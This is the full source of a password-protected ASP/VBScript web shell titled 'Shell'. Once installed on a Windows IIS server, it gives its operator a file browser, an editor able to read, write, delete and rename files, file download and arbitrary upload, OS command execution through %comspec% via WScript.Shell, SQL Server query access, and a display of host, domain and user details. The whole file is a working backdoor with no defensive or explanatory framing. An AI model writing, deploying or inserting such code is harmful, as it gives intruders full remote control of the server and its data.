<% @language = "VBScript" %>
<%
on error resume next

dim fso, wshell, wnet 
dim fpath, i, folder, list
dim FileName, ContentType, Value
dim shell, password, style, this_url, root_path

set fso = CreateObject("Scripting.FileSystemObject")
set wshell = CreateObject("WScript.Shell")
set wnet = Server.CreateObject("WSCRIPT.NETWORK")

root_path = fso.GetFolder(Server.MapPath("\")) & "\"
this_url = Request.ServerVariables("URL")
Server.ScriptTimeout = 120
Session.Timeout = 60 
password = "pass"
style = "light"

sub Echo(line) 
	response.write line  
end sub

function S_GET(get_request)
	S_GET = Request.QueryString(get_request)
end function

function S_POST(post_request) 
	S_POST = Request.Form(post_request)
end function

function this_path()
	if len(trim(S_GET("path"))) <> 0 and fso.FolderExists(trim(S_GET("path"))) then
		Response.Cookies("shell_path") = trim(S_GET("path")) 
		this_path = trim(S_GET("path"))
	elseif len(Request.Cookies("shell_path")) = 0 or not fso.FolderExists(Request.Cookies("shell_path")) then 
		Response.Cookies("shell_path") = root_path
		this_path = root_path
	else 
		this_path = Request.Cookies("shell_path")
	end if
end function

function Action() 
	if len(S_POST("download")) > 0 then 
		action = "download"
	elseif S_POST("sql") > 0 then 
		action = "sql"
	elseif S_GET("act") <> "" then 
		action = trim(S_GET("act"))
	else 
		action = ""
	end if 
end function

sub Login()
	if Request.Cookies("shell_login") = password then exit sub
	%>
	<html><form method="POST"><input name="password" style="border:0px"><form>
	<%
	if S_POST("password") = password then 
		Response.Cookies("shell_login") = password
		Response.Redirect this_url
	else 
		Response.End
	end if 
end sub

sub Logout()
	Response.Cookies("shell_login") = ""
	Response.Cookies("shell_path") = ""
	Response.Cookies("shell_sql") = ""
	Response.Redirect this_url
	Response.End
end sub

sub Downloader(filepath)
	dim downfile, stream 
	
	Set downfile = fso.GetFile(filepath)
	set stream = Server.CreateObject("ADODB.Stream")

	Response.AddHeader "Content-Disposition", "attachment; filename=" & downfile.Name  
	Response.ContentType = "application/octet-stream"
	Response.Charset = "UTF-8"
	stream.Open
	stream.Type = 1
	stream.LoadFromFile(downfile.Path)
	Response.BinaryWrite(stream.Read)
	stream.Close
	Response.End
	
	set stream = Nothing
	set downfile = Nothing
end sub

sub FileBrowser(path)
	%>
	<table class="fbrowser"> 
		<tr style="<% echo colors("tr") %>">
			<th>CWD: <% GetCwd(this_path) %></th>
			<th class="menu" ><a href="<% = this_url %>?act=fbrowser&path=<% = root_path %>">Home</a></th>
			<th>Drives: <% Locations() %></th>
			<th></th>
			<th></th>
		</tr>
		<tr style="<% echo colors("tr") %>">
			<th align="left">Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Accessed</th><th>Created</th>
		</tr>
	<%
	set folder = fso.GetFolder(path)
	if not folder.IsRootFolder then
		%>
		<tr style="<% echo colors("tr") %>">
			<td><a href="<% echo this_url %>?&act=fbrowser&path=<% Server.URLEncode(folder.ParentFolder.Path) %>\">..</a></td>
		</tr>
		<%
	end if

	set list = folder.SubFolders
	for each i in list
		%>
		<tr>
			<td><a href="<% echo this_url %>?act=fbrowser&path=<% echo Server.URLEncode(i.Path) %>\"><% echo i.Name %>\</a></td>
			<td>Folder</td>
			<td><% echo getAttr(i.Attributes) %></td>
			<td><% echo DateFormat(i.DateLastModified) %></td>
			<td><% echo DateFormat(i.DateLastAccessed) %></td>
			<td><% echo DateFormat(i.DateCreated) %></td>
		</tr>
		<%
	next

	set list = folder.Files
	for each i in list
	    %>
		<tr>
			<td><a href="<% echo this_url %>?act=feditor&path=<% echo trim(S_GET("path")) %>&file=<% echo Server.URLEncode(i.Path) %>"><% echo i.Name %></a></td>
			<td><% echo FormatNumber(i.Size, 0) %></td>
			<td><% echo getAttr(i.Attributes) %></td>
			<td><% echo DateFormat(i.DateLastModified) %></td>
			<td><% echo DateFormat(i.DateLastAccessed) %></td>
			<td><% echo dateFormat(i.DateCreated) %></td>
		</tr>
		<%
	next
	
	set list = Nothing
	set folder = Nothing
	%></table><%
end sub

function getAttr(attr)
	if attr = 0 or attr = 2 or attr = 4 or attr = 32 then 
		getAttr = "read/write"
	elseif attr = 1 or attr = 8 or attr = 16 or attr = 64 or attr = 1024 or attr = 2048 then 
		getAttr = "read"
	else 
		getAttr = """" & attr & """"
	end if
end function 

function DateFormat(d) 
	DateFormat = FormatDateTime(d, 2) & " " & FormatDateTime(d, 4)
end function

sub GetCwd(path)
	dim temppath : temppath = ""
	set folder = fso.GetFolder(path)
	list = split(folder.path, "\")

	for each i in list
		temppath = temppath & i & "\"
		echo "<a href=" & this_url & "?act=fbrowser&path=" & Server.URLEncode(temppath) & ">" & i & "\</a>"
	next
	set folder = Nothing
end sub

sub Locations()
	for each i in fso.Drives
		if i.IsReady then
			echo "<a href=" & this_url & "?act=fbrowser&path=" & i.DriveLetter & ":\>" & i.DriveLetter & ":\</a>&nbsp;&nbsp;"
		else 
			echo i.DriveLetter & ":\&nbsp;&nbsp;"
		end if
	next
end sub

sub FileEditor(fpath)
	Dim content, data, message, f	
	
	content = ""
	message = ""
	if trim(S_POST("fpath")) <> "" then fpath = trim(S_POST("fpath"))
	
	if (len(S_POST("read")) > 0)  then 
		if fso.FileExists(fpath) then 
			set f = fso.OpenTextFile(fpath, 1)
		
			content = Server.HTMLEncode(f.readall)
			f.close
			set f = Nothing
		else 
			message = "Can't access file."
		end if
	elseif len(S_POST("write")) > 0 then 
		if fso.FolderExists(fpath) then 
			message = "Use mkdir."
		else 
			set f = fso.OpenTextFile(fpath, 2, 2)
			
			message = "Failed." 
			data = Request.Form("content")
			f.write(data) 
			if err.number = 0 then message = "File saved." 
			f.close
			set f = nothing
		end if
	elseif len(S_POST("delete")) > 0 then
		message = "Failed."
		if fso.FileExists(fpath) then  
			fso.deleteFile(fpath) 
			if err.number = 0 then message = "File removed."
		elseif fso.FolderExists(fpath) then 
			fso.DeleteFolder(fpath)
			if err.number = 0 then message = "Dir Removed." 
		end if 
 	elseif len(S_POST("rename")) > 0 then 
		message = "Failed." 
		if fso.FileExists(S_GET("file")) then 
			fso.MoveFile S_GET("file"), fpath 
			if err.number = 0 then message = "Renamed." 
		end if 
	elseif len(S_POST("folder")) > 0 then
		message = "Failed." 
		fso.CreateFolder(fpath) 
		if err.number = 0 then message = "Created."
	end if
	%>
	<form method="POST" name="editor">
		<Input size="60" type="text" name="fpath" value="<% echo fpath %>" />
		<input type="submit" name="read" value="read >>" />
		<input type="submit" name="write" value="write >>" />
		<input type="submit" name="delete" value="rmove >>" />
		<input type="submit" name="rename" value="rname >>" />
		<input type="submit" name="download" value="dnload >>" />
		<input type="submit" name="folder" value="mkdir >>" />
		&nbsp;&nbsp;<b><% echo message %></b>
		<br>
		<pre><textarea name='content'><% echo content %></textarea></pre>
	</form> 
	<%
end sub

sub RunCmd()
	%>
	<form method="POST" name="shell">
		<Input size="80" type="text" name="cmd" value="cmd_" />
		<input type="submit" name="submit" value=">>" />
	</form>
	<%
	dim objCmd, cmd, cmd_result 

	if len(S_POST("submit")) > 0 then
		cmd = "%comspec% /c " & trim(S_POST("cmd"))
		set objCmd = wshell.Exec(cmd)

		cmd_result = objCmd.StdOut.Readall() & objCmd.StdErr.ReadAll()
		echo "<pre>" & replace(cmd_result, vbCrLf, "<br>") & "</pre>"
		set objCmd = nothing
	end if
end sub

sub Database()
	Dim objCn, objRS, i, qry, sqlExec, host, user, pass, db, dbms 
	
	host = dbValues("host")
	user = dbValues("user")
	pass = dbValues("pass")
	db = dbValues("db")
	dbms = dbValues("dbms")
	
	if S_GET("qry") <> "" then qry = trim(S_GET("qry"))
	if len(S_POST("submit")) > 0 then qry = S_POST("qry")
	if qry = "" then qry = "SELECT * FROM INFORMATION_SCHEMA.TABLES;"
	%>
	<form method="POST" name="sql">
		<Input size="12" type="text" name="host" value="<% echo host %>" />
		<Input size="12" type="text" name="user" value="<% echo user %>" />
		<Input size="12" type="text" name="pass" value="<% echo pass %>" />
		<Input size="12" type="text" name="db" value="<% echo db %>" />
		<Input size="12" type="text" name="dbms" value="<% echo dbms %>" />
		<Input size="60" type="text" name="qry" value="" />
		<input type="submit" name="submit" value=">>" />
	</form>
	<%
	if len(S_POST("submit")) = 0 and len(S_GET("qry")) = 0 then exit sub
	
	Set objCn = Server.CreateObject("ADODB.Connection")
	objCn.ConnectionString = "DRIVER={SQL Server}; server=" & host & "; uid=" & user & "; pwd=" & pass & "; DATABASE=" & db & ";"
	objCn.Open
	set sqlExec = objCn.Execute(qry)
	
	if InStr(ucase(trim(qry)), "SELECT") <> 1 and InStr(ucase(trim(qry)), "SHOW") <> 1 then 
		echo "<b> Query submited. </b>"
		exit sub 
	end if
	
	echo "<table class='sql'>"
	echo "<tr>"
	for each i in sqlExec.Fields
		echo "<th>" & i.name & "</th>"
	next 
	echo "</tr>"
	
	sqlExec.MoveFirst
	do while not sqlExec.EOF
		echo "<tr>"
		for each i in sqlExec.Fields
			if i.name = "TABLE_NAME" then 
				echo "<td><a href='" & this_url & "?act=sql&qry=" & Server.URLEncode("SELECT * FROM " & i.value) & "'>" & i.value & "</a></td>"
			else 
				echo "<td>" & i.value & "</td>"
			end if 
		next
		sqlExec.MoveNext
		echo "</tr>"
	loop
	echo "<table></div>"
	
	sqlExec.Close
	objCn.Close
	set sqlExec = Nothing
	Set objCn = Nothing
end sub

function dbValues(value) 
	if trim(S_POST(value)) <> "" and S_POST("host") <> "host" then 
		Response.Cookies("shell_sql")(value) = S_POST(value)
		dbValues = S_POST(value)
	elseif len(Request.Cookies("shell_sql")(value)) > 0 then 
		dbValues = Request.Cookies("shell_sql")(value)
	else 
		dbValues = value
	end if
end function 

Function BuildUpload(RequestBin)
	dim PosBeg, PosEnd, boundary, boundaryPos, UploadControl, Pos, Name, PosFile, PosBound 
	'Get the boundary
	PosBeg = 1
	PosEnd = InstrB(PosBeg, RequestBin, getByteString(chr(13)))
	boundary = MidB(RequestBin, PosBeg, PosEnd-PosBeg)
	boundaryPos = InstrB(1, RequestBin, boundary)
	'Get all data inside the boundaries
	Do until (boundaryPos = InstrB(RequestBin, boundary & getByteString("--")))
		'Members variable of objects are put in a dictionary object
		Set UploadControl = CreateObject("Scripting.Dictionary")
		'Get an object name
		Pos = InstrB(BoundaryPos, RequestBin, getByteString("Content-Disposition"))
		Pos = InstrB(Pos, RequestBin, getByteString("name="))
		PosBeg = Pos + 6
		PosEnd = InstrB(PosBeg, RequestBin, getByteString(chr(34)))
		Name = getString(MidB(RequestBin, PosBeg, PosEnd-PosBeg))
		PosFile = InstrB(BoundaryPos, RequestBin, getByteString("filename="))
		PosBound = InstrB(PosEnd, RequestBin, boundary)
		'Test if object is of file type
		If PosFile <> 0 AND PosFile < PosBound Then
			'Get Filename, content-type and content of file
			PosBeg = PosFile + 10
			PosEnd = InstrB(PosBeg, RequestBin, getByteString(chr(34)))
			FileName = getString(MidB(RequestBin, PosBeg, PosEnd-PosBeg))
			'Add filename to dictionary object
			UploadControl.Add "FileName", FileName
			Pos = InstrB(PosEnd, RequestBin, getByteString("Content-Type:"))
			PosBeg = Pos + 14
			PosEnd = InstrB(PosBeg, RequestBin, getByteString(chr(13)))
			'Add content-type to dictionary object
			ContentType = getString(MidB(RequestBin, PosBeg, PosEnd - PosBeg))
			UploadControl.Add "ContentType", ContentType
			'Get content of object
			PosBeg = PosEnd + 4
			PosEnd = InstrB(PosBeg, RequestBin, boundary) - 2
			Value = MidB(RequestBin, PosBeg, PosEnd-PosBeg)
		Else
			'Get content of object
			Pos = InstrB(Pos, RequestBin, getByteString(chr(13)))
			PosBeg = Pos + 4
			PosEnd = InstrB(PosBeg, RequestBin, boundary) - 2
			Value = getString(MidB(RequestBin, PosBeg, PosEnd - PosBeg))
		End If
		UploadControl.Add "Value" , Value
		UploadRequest.Add name, UploadControl
		BoundaryPos = InstrB(BoundaryPos + LenB(boundary), RequestBin, boundary)
	Loop
End Function

Function getByteString(StringStr)
     For i = 1 to Len(StringStr)
          char = Mid(StringStr, i, 1)
          getByteString = getByteString & chrB(AscB(char))
     Next
End Function

Function getString(StringBin)
     getString = ""
     For i = 1 to LenB(StringBin)
          getString = getString & chr(AscB(MidB(StringBin, i, 1)))
     Next
End Function

If request.querystring("upload") = "ok" then 
	dim byteCount, RequestBin, UploadRequest, filepathname, path, f
	byteCount = Request.TotalBytes
	RequestBin = Request.BinaryRead(byteCount)
	Set UploadRequest = CreateObject("Scripting.Dictionary")
	BuildUpload(RequestBin)
	If UploadRequest.Item("file").Item("Value") <> "" Then
		contentType = UploadRequest.Item("file").Item("ContentType")
		filepathname = UploadRequest.Item("file").Item("FileName")
		filename = Right(filepathname,Len(filepathname)-InstrRev(filepathname,"\"))
		value = UploadRequest.Item("file").Item("Value")
		path = UploadRequest.Item("path").Item("Value")
		filename = path & filename

		Set f = fso.CreateTextFile(filename)
		For i = 1 to LenB(value)
			f.Write chr(AscB(MidB(value, i , 1)))
		Next
		f.Close
		Set f = Nothing
	End If
	Set UploadRequest = Nothing
End If

sub upload_form()
	%>
	<form action="?act=fuploader&upload=ok" method="POST" enctype="multipart/form-data">
		<input type="text" name="path" size="60" value="<% = this_path() %>" />
		<input type="file" name="file" />
		<input type="submit" name="upload" Value=" >>" />
	</form>
	<%
end sub

sub ServerInfo()
	%>
	<table> 
		<tr>
			<th><% OsInfo() %></th>
			<th>Server: <% echo Request.ServerVariables("SERVER_SOFTWARE") %></th>
		</tr>
		<tr>
			<th>Computer: <% echo wnet.ComputerName %></th>
			<th>Domain: <% echo wnet.UserDomain %></th>
			<th>User: <% echo wnet.UserName %></th>
			<th>IP: <% echo request.ServerVariables("LOCAL_ADDR") %></th>
		</tr>
	</table>
	<%
end sub

sub OsInfo() 
	dim SystemSet, System
	Set SystemSet = GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem") 
	
	for each System in SystemSet 
		echo System.Caption & " " & System.Version
	next 
	set SystemSet = nothing
end sub 

function Colors(part)
	dim css 
	
	if style = "dark" then 
		css = array("#ddefff", "#181818", "#ddefff", "#83c5ff", "#202020")
	else 
		css = array("#181818", "#f0f8ff", "#015fb2", "#00437e", "#ddefff")
	end if 
	
	if part = "body" or part = "table" or part = "tr" or part = "th" or part = "td" then 
		colors = "color:" & css(0) & "; background-color:" & css(1) & "; "
	elseif part = "input" then 
		if style = "dark" then colors = "color:" & css(1) & "; background-color:" & css(0) & "; border:1px solid " & css(3) & "; "
		if style = "light" then colors = "color:" & css(4) & "; background-color:#242424 ; border:1px solid " & css(2) & "; " 
	elseif part = "hover" then 
		colors = "color:" & css(0) & "; background-color:" & css(4) & "; "
	else 
		colors = css 
	end if
end function

class AspShell
	
	public sub Access() 
		Login() 
	end sub 
	
	public sub Download()
		if action() = "download" then Downloader(trim(S_GET("file"))) 
	end sub 
	
	public sub Header() 
		ServerInfo()
	end sub
	
	public sub Body(action) 
		if action = "fbrowser" then
			FileBrowser(this_path)
		elseif action = "feditor" then
			fpath = this_path()
			if trim(S_GET("file")) <> "" then fpath = trim(S_GET("file"))
			FileEditor(fpath)
		elseif action = "fuploader" then
			upload_form()
		elseif action = "cmd" then
			RunCmd()
		elseif action = "sql" then
			Database()
		elseif action = "exit" then
			Logout()
		end if
	end sub
	
end class 

%>
<% set shell = new AspShell %>
<% shell.access() %>
<% shell.download() %>
<html>
<head>
	<title>Shell</title>
	<style>
		body { <% echo colors("body") %> text-align:left; padding:2px; font-size:12px; }
		table { <% echo colors("table") %> border-collapse:collapse; width:100%; padding:2px; font-size:12px; }
		th { font-size:13px; text-align:left; padding:2px; }
		td { font-size:12px; text-align:left; padding:2px; }
		table.fbrowser tr { <% echo colors("tr") %> }
		table.fbrowser tr:hover { <% echo colors("hover") %> } 
		.sql { border:1px solid <% echo colors("css")(0) %>; <% echo colors("table") %> width:100%; padding:2px; font-size:12px;}
		.sql th { <% echo colors("th") %>  border:1px solid <% echo colors("css")(0) %>;}
		.sql td { font-size:12px; text-align:left; padding:2px; } 
		.sql tr { <% echo colors("tr") %> }
		.sql tr:hover { <% echo colors("hover") %> }
		input { border:1px solid <% echo colors("css")(0) %>; font-size:12px; padding:2px; <% echo colors("input") %> }
		textarea { width:100%; height:100%; }
		div { padding:2px; }
		.sep { padding:0px; }
		a:link { color:<% echo colors("css")(2) %>; }
		a:visited { color:<% echo colors("css")(3) %>; }
		.menu { text-align:left; padding:2px; font-size:13px; }
		.menu a { color:<% echo colors("css")(0) %>; text-decoration:none; }
	</style>
</head>
<body>
<div>
	<% shell.header() %>
</div>
<div>
	<hr>
	<table class="menu"> 
		<tr>
			<th><a href="<% = this_url %>?act=fbrowser">FileBrowser</a></th>
			<th><a href="<% = this_url %>?act=feditor">FileEditor</a></th>
			<th><a href="<% = this_url %>?act=fuploader">FileUploader</a></th>
			<th><a href="<% = this_url %>?act=cmd">RunCmd</a></th>
			<th><a href="<% = this_url %>?act=sql">SqlQueries</a></th>
			<th><a href="<% = this_url %>?act=exit">Exit</a></th>
		</tr>
	</table>
	<hr>
</div>
<div>
	<% shell.body(action())%>
</div>
</body>
</html>
<% set shell = nothing %>
<% set fso = nothing %>
<% set wshell = nothing %>
<% set wnet = nothing %>
